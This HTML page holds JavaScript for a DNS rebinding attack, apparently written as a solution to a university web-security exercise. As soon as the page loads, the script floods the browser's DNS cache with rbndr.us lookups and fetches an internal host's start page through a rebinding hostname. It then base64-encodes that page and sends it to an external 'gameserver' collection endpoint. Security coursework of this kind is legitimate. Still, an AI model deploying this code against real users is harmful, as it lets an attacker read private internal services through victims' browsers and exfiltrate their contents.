<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>Rebind Attack</title>
</head>

<body>

<h1>DNS RBNDR Attack</h1><!-- address generated for:</h1>
<h2>Host address #1: </h2><p id="host_addr1"></p>
<h2>Host address #2: </h2><p id="host_addr2"></p>
<h2>Attack address: </h2><p id="target_addr"></p>-->

<script>

    function convert_rbndr(addr)
    {
        return addr.split('.')
            .map(function (a) { return Number(a).toString(16) })
            .map(function (a) { return a.length < 2 ? "0" + a : a })
            .join('');
    }

    function generate_rbndr(addr1, addr2) {
        const rbndr1 = convert_rbndr(addr1);
        const rbndr2 = convert_rbndr(addr2);
        return 'http://' + rbndr1 + '.' + rbndr2 + '.rbndr.us';
    }

    function addr(x, y, z, w) {
        return x + '.' + y + '.' + z + '.' + w;
    }

    function flush_dnscache(lookups) {

        if (typeof lookups == 'undefined') {
            lookups = 1600;
        }

        const step = 2;

        const low_start = 1;
        const low_end = 254;
        const low_num = (low_end - low_start) + 1;

        const high_start = 1;
        const high_end = Math.floor
        ((lookups * step) / ((low_end - low_start) + 1));
        const high_num = (high_end - high_start) + 1;

        const lookup = (Math.floor(low_num / step) * high_num);

        console.log('flush_dnscache(): Got request for ' + lookups + ' lookups');
        console.log('flush_dnscache(): low_start: ' + low_start + ', low_end: ' + low_end +
            ' low_num: ' + low_num);
        console.log('flush_dnscache(): high_start: ' + high_start + ', high_end: ' + high_end +
            ' high_num: ' + high_num);
        console.log('flush_dnscache(): Starting with ' + lookup + ' lookups, step: ' + step + '...');

        let loop_count = 0;

        for (let i = high_start; i <= high_end; i++) {
            for (let j = low_start; j <= low_end; j += step) {
                const addr1 = addr(127, 0, i, j);
                const addr2 = addr(127, 0, i, j + (step - 1));
                const hostname = generate_rbndr(addr1, addr2);
                const flushRequest = new XMLHttpRequest();
                flushRequest.open("GET", hostname, false);
                try {
                    flushRequest.send();
                } catch {}
                loop_count++;
            }
        }

        console.log('flush_dnscache(): Flooded DNS cache with ' + lookup + ' lookups.');
        return loop_count;

    }

    function send_gameserver(message) {
        const gameserver = new XMLHttpRequest();
        gameserver.open('POST', 'https://gameserver.websec.saarland/leak', false);
        gameserver.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        gameserver.send('secret=deaddeaddeaddeaddeaddeaddeaddead&data=' + message);
    }

    /* global host_addr1, host_addr2, target_addr */
    function attack_rebind() {

        //For debugging purposes
        send_gameserver('Crawler called the attack_rebind function!');

        //Flood the DNS cache
        const count = flush_dnscache(2000);

        send_gameserver('DNS flood request count: ' + count);

        //Request the start page from the (hopefully) internal host
        const internalRequest = new XMLHttpRequest();
        internalRequest.open('GET', 'http://8660e137.ac110001.rbndr.us', false);
        internalRequest.send();

        //Send the start page back to the gameserver
        send_gameserver(btoa(internalRequest.responseText));

    }

    attack_rebind();

</script>

</body>
</html>
